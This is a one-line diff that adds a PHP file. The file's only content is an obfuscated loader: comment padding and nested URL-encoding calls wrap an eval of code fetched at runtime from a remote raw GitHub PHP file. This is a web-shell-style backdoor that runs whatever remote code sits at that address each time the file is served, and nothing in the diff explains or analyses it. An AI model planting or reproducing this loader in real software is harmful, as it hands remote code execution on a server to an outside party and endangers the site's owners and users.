@@ -1,0 +1,1 @@
+<?=/****/@null; /********/ /*******/ /********/@eval/****/("?>".file_get_contents/*******/(urldecode(urlencode(rawurldecode(rawurlencode("https://raw.githubusercontent.com/b1dar4/DIOS-SQL-INJECTION/refs/heads/main/civil.php"))))));/**/?>
